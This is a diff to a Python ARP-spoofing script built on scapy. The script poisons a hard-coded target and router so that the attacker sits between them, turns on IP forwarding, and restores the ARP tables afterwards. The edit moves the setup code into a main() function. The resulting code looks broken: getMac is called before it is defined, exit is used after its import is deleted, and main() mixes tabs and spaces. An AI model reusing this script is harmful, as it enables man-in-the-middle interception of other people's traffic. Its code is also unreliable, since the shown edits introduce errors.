@@ -1,7 +1,18 @@
 import scapy.all as scapy
-from sys import exit
 from time import sleep
 import threading
+
+mymac = None
+targetip = "192.168.1.101"
+routerip = "192.168.1.19"
+
+try:
+	targetmac = getMac(targetip)
+	routermac = getMac(routerip)
+except Exception as e:
+	print("Couldn't get mac address")
+	print(e)
+	exit(1)
 
 def getMac(ip):
 	arp_request = scapy.ARP(pdst=ip)
@@ -54,22 +65,9 @@ def ipForward():
                                 y.write("1")
 
 
+def main():
 
-mymac = None
-targetip = "192.168.1.101"
-routerip = "192.168.1.19"
-
-try:
-	targetmac = getMac(targetip)
-	routermac = getMac(routerip)
-except Exception as e:
-	print("Couldn't get mac address")
-	print(e)
-	exit(1)
-
-showOptions()
-
-def run():
+        showOptions(mymac,targetip,targetmac,routerip,routermac)
 
 	for x in range(5):
 		spoof(targetip,targetmac,routerip,mymac) # tells target that you are the router
@@ -85,5 +83,6 @@ def run():
 	spoof(routerip,routermac,targetip,targetmac)
 
 		
-run()
+if __name__ == "__main__":
+        main()
 
